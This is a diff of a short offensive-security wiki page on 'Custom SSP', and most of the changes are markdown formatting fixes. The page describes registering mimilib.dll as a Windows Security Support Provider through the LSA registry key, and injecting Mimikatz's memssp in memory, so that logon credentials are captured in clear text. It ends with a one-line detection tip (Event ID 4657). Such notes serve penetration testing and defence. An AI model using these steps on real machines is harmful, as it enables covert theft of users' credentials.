@@ -1,9 +1,8 @@
 # Custom SSP
 
-
 ### Custom SSP
 
-[[../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi|Learn what is a SSP (Security Support Provider) here.]]\
+[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
 You can create you **own SSP** to **capture** in **clear text** the **credentials** used to access the machine.
 
 #### Mimilib
@@ -18,13 +17,13 @@ PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packag
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
     Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-```
+
 Add `mimilib.dll` to the Security Support Provider list (Security Packages):
 
 ```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-```
+
 And after a reboot all credentials can be found in clear text in `C:\Windows\System32\kiwissp.log`
 
 #### In memory
@@ -35,12 +34,10 @@ You can also inject this in memory directly using Mimikatz (notice that it could
 privilege::debug
 misc::memssp
 ```
-```
+
 This won't survive reboots.
 
 #### Mitigation
 
 Event ID 4657 - Audit creation/change of `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
-
-
 
